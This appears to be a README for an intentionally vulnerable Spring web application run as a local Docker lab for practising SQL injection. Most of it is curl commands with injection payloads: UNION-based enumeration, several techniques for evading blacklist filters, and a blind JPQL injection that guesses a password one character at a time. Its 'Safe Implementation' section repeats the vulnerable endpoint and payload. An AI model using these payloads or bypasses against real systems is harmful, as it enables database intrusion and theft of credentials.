# SQLi vulnerable Spring Application

## TL;DR

To build and run:
```
sudo docker build -t sqli_victim_webapp_java_spring .; sudo docker run --name victim.sqli.webapp_java_spring.tld -ti -p 127.0.0.1:5808:8080 -v "$(pwd)"/webapp_java_spring/:/usr/src/ sqli_victim_webapp_java_spring
```

To fill the database:

```
curl -X GET 'localhost:5808/sqlidemo/all'
curl -X POST localhost:5808/sqlidemo/add -d username=user -d password=password
```

Read username by id:

```
curl localhost:5808/sqlidemo/vulnbyid -d id=1
```

To get access to the database:
```
sudo docker exec -ti victim.sqli.webapp_java_spring.tld mysql --host localhost -uuser -ppassword sqli_example
```

## SQLi

### Java based

Check for union select:

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,NULL -- "
curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,'A'"
````

Enumerate database:

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,(SELECT @@VERSION) -- "
curl -X GET localhost:5808/sqlidemo/vulnbyid\?id="1'+UNION+SELECT+NULL,NULL,(SELECT+@@VERSION)+--+"
```

#### Blacklist 

##### Single Quote Replacement

Using Escape Sequences ([https://mariadb.com/kb/en/string-literals/](https://mariadb.com/kb/en/string-literals/)):

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1\' UNION SELECT NULL,NULL,(SELECT @@VERSION) -- " -d blacklistconfig=oddsinglequotes
```

##### All Lowercase

```  
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select @@version) -- " -d blacklistconfig=alllowercase
```

##### All Uppercase

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,(SELECT @@VERSION) -- " -d blacklistconfig=alluppercase
```

##### Keyword Combination Check

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union/**/select null,null,(select @@Version) -- " -d blacklistconfig=keyworddetection
```

##### String Detection I

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=CONCAT('VERSIO','N')) --
```

or

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name='VERSIO' 'N')
```


##### String Detection II

Using

```
echo -n 'VERSION'|base64
```

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=FROM_BASE64('VkVSU0lPTg==')) -- "
```

##### String Detection III

Using

```
printf '%d %d %d %d %d %d %d' "'V" "'E" "'R" "'S" "'I" "'O" "'N"
```

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=CHAR(86,69,82,83,73,79,78)) -- "
```

##### String Detection IV  

Using

```
SELECT CONCAT('0x',HEX('VERSION'))
``` 

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(select variable_value from information_schema.global_variables where variable_name=0x56455253494F4E) -- "
```

##### All together

```
curl localhost:5808/sqlidemo/vulnbyid -d id="1\' union select null,null,(select @@version) -- " -d blacklistconfig=oddsinglequotes,alllowercase
```

### JPQL based

```
curl localhost:5808/sqlidemo/add -d username=user -d password=password
curl localhost:5808/sqlidemo/vulnbyid2 -d id="1' AND SUBSTRING(password,1,1)='p" 
curl localhost:5808/sqlidemo/vulnbyid2 -d id="1' AND SUBSTRING(password,1,1)='a" 
```

## Safe Implementation

### JPQL based

```
curl localhost:5808/sqlidemo/add -d username=user -d password=password
curl localhost:5808/sqlidemo/vulnbyid2 -d id="1' AND SUBSTRING(password,1,1)='p"
```
